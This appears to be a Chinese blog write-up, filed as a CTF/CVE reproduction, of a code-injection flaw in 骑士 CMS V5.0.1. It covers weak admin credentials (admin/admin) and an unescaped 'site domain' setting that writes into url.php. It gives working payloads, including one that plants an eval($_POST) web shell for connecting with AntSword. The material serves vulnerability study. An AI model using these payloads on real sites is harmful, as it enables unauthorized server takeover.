---
title: 骑士 CMS V5.0.1
date: '2026-10-22 22:40:38'
tags: []
categories:
  - CTF-Writeups
  - CVE复现
slug: 骑士 CMS V5.0.1
permalink: /cms-v5-0-1
draft: false
---

![](/images/20261022224101.png)

核心利用点在于“网站配置”中的“网站域名”参数过滤不严，可注入 PHP 代码并写入配置文件，从而执行任意代码。
后台地址：/index.php?m=admin&c=index&a=login
登录后台试试
![](/images/20261022224101_1.png)

尝试弱口令爆破，得到账号密码：`admin/admin`
**定位注入点**：进入后台后，找到“系统” -> “网站配置” -> “网站域名”设置项。
![](/images/20261022224101_2.png)

这里因为后台更新配置时，将用户输入的 `site_domain` 直接传入 `update_config` 函数。该函数使用 `var_export()` 生成配置数组并写入 `url.php` 文件。由于 `var_export` 默认用单引号包裹字符串，且输入中的单引号未被转义，攻击者可通过构造 `',代码,'` 的形式闭合字符串，将恶意 PHP 代码注入配置文件，进而被包含执行。
尝试绕过
```
http://127.0.0.1/.',phpinfo(),'/.com
```

![](/images/20261022224101_3.png)

代码成功执行。
也可以执行以下语句然后连接蚁剑拿下整个服务器
```
http://127.0.0.1/.',eval($_POST[a]),'/.com
```
